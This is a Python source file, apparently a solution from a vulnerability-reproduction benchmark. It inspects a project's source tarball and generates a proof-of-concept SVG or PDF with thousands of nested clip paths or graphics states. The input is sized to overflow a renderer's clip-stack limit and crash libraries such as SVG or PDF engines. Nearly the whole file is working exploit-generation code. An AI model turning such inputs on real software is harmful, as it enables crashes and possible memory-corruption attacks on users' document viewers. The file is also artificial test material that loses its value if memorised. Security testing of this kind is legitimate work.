import os
import re
import tarfile
from typing import Optional, Tuple


def _safe_read_member(tf: tarfile.TarFile, m: tarfile.TarInfo, limit: int = 1_000_000) -> bytes:
    try:
        f = tf.extractfile(m)
        if not f:
            return b""
        data = f.read(limit)
        return data if isinstance(data, bytes) else b""
    except Exception:
        return b""


def _detect_project_and_limits(src_path: str) -> Tuple[str, Optional[int]]:
    fmt = "svg"
    limit = None
    try:
        with tarfile.open(src_path, mode="r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name_lower = os.path.basename(m.name).lower()
                if not any(name_lower.endswith(ext) for ext in (".h", ".hh", ".hpp", ".c", ".cc", ".cpp", ".cxx", ".rs", ".txt", ".md")):
                    continue
                data = _safe_read_member(tf, m, limit=2_000_000)
                if not data:
                    continue
                text = None
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue

                # format detection
                if fmt != "svg":
                    # prefer svg by default
                    pass
                # Simple signals to prefer PDF if clearly dominant
                if re.search(r"(?i)\bpdfium\b|\bpoppler\b|\bpdf\b|\bFPDF\b", text):
                    fmt = "pdf"

                # heuristic: if there's explicit svg references, stick with svg
                if re.search(r"(?i)\bsvg\b|\bSkSVG\b|\blibrsvg\b|\busvg\b|\bresvg\b|\bNanoSVG\b", text):
                    fmt = "svg"

                # try to find a clip depth/limit constant
                for mobj in re.finditer(r"(?im)^\s*#\s*define\s+([A-Za-z0-9_]*(CLIP|CLIPPING)[A-Za-z0-9_]*(DEPTH|STACK|LEVEL)[A-Za-z0-9_]*)\s+([0-9]{2,6})\b", text):
                    try:
                        val = int(mobj.group(4))
                        if val > 0:
                            limit = max(limit or 0, val)
                    except Exception:
                        pass

                # also pick up const variables
                for mobj in re.finditer(r"(?i)\b(kMax|MAX|Max)[A-Za-z0-9_]*(Clip|Clipping)[A-Za-z0-9_]*(Depth|Stack|Level)[A-Za-z0-9_]*\s*=\s*([0-9]{2,6})\b", text):
                    try:
                        val = int(mobj.group(4))
                        if val > 0:
                            limit = max(limit or 0, val)
                    except Exception:
                        pass
    except Exception:
        pass
    return fmt, limit


def _choose_depth(limit: Optional[int], hard_min: int = 2048, hard_max: int = 20000) -> int:
    # Aim to exceed any found limit but avoid extreme recursion depth risking stack overflow
    if limit is None:
        return hard_min
    # choose some buffer above limit
    target = max(limit + 64, hard_min)
    if target > hard_max:
        target = hard_max
    return target


def _generate_svg_nested_clips(n: int) -> bytes:
    # Build minimal yet valid SVG that applies N nested unique clip paths.
    # Keep groups nested to increase clip stack depth while avoiding overly deep recursion by limiting n.
    parts = []
    parts.append('<?xml version="1.0" encoding="UTF-8"?>')
    parts.append('<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16">')
    parts.append('<defs>')
    # Define N unique clipPaths
    # Keep geometry minimal
    for i in range(n):
        parts.append(f'<clipPath id="c{i}"><rect x="0" y="0" width="16" height="16"/></clipPath>')
    parts.append('</defs>')
    # Nest N groups each applying its own clipPath
    for i in range(n):
        parts.append(f'<g clip-path="url(#c{i})">')
    # Add a simple payload shape
    parts.append('<rect x="1" y="1" width="1" height="1" fill="#000"/>')
    # Close all groups
    for _ in range(n):
        parts.append('</g>')
    parts.append('</svg>')
    data = "".join(parts)
    return data.encode("utf-8")


def _generate_pdf_nested_clips(n: int) -> bytes:
    # Generate a minimal PDF with a single page whose content stream performs
    # N nested clipping operations with saved graphics states.
    # Not all PDF consumers behave the same, but this should be valid enough
    # for common PDF engines (e.g., pdfium/poppler) to parse and process.
    # Content stream:
    #   q
    #   0 0 10 10 re W n
    # repeated N times, then Q repeated N times.
    content_parts = []
    for _ in range(n):
        content_parts.append("q\n")
        content_parts.append("0 0 10 10 re W n\n")
    for _ in range(n):
        content_parts.append("Q\n")
    content = "".join(content_parts).encode("ascii")

    # Build objects
    objs = []

    def pdf_obj(num: int, payload: str) -> bytes:
        return f"{num} 0 obj\n{payload}\nendobj\n".encode("ascii")

    # 1: Catalog
    objs.append(pdf_obj(1, "<< /Type /Catalog /Pages 2 0 R >>"))

    # 2: Pages
    objs.append(pdf_obj(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>"))

    # 3: Page
    objs.append(pdf_obj(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 20 20] /Contents 4 0 R /Resources << >> >>"))

    # 4: Contents
    stream_header = f"<< /Length {len(content)} >>\nstream\n".encode("ascii")
    stream_footer = b"endstream\n"
    obj4 = b"4 0 obj\n" + stream_header + content + stream_footer + b"endobj\n"
    objs.append(obj4)

    # Assemble PDF with xref
    pdf_parts = []
    pdf_parts.append(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
    offsets = []
    current_offset = sum(len(p) for p in pdf_parts)
    for o in objs:
        offsets.append(current_offset)
        pdf_parts.append(o)
        current_offset += len(o)

    xref_start = current_offset
    xref = ["xref\n0 5\n"]
    xref.append("0000000000 65535 f \n")
    for off in offsets:
        xref.append(f"{off:010d} 00000 n \n")
    xref_bytes = "".join(xref).encode("ascii")
    pdf_parts.append(xref_bytes)
    current_offset += len(xref_bytes)

    trailer = f"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n{xref_start}\n%%EOF\n".encode("ascii")
    pdf_parts.append(trailer)

    return b"".join(pdf_parts)


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt, limit = _detect_project_and_limits(src_path)
        depth = _choose_depth(limit, hard_min=2048, hard_max=16000)

        if fmt == "pdf":
            try:
                return _generate_pdf_nested_clips(depth)
            except Exception:
                # Fallback to SVG if something goes wrong
                return _generate_svg_nested_clips(depth)
        else:
            # default to SVG
            try:
                return _generate_svg_nested_clips(depth)
            except Exception:
                # As a last resort, return a minimal SVG
                return b'<svg xmlns="http://www.w3.org/2000/svg"><defs><clipPath id="c0"><rect x="0" y="0" width="1" height="1"/></clipPath></defs><g clip-path="url(#c0)"><rect x="0" y="0" width="1" height="1"/></g></svg>'
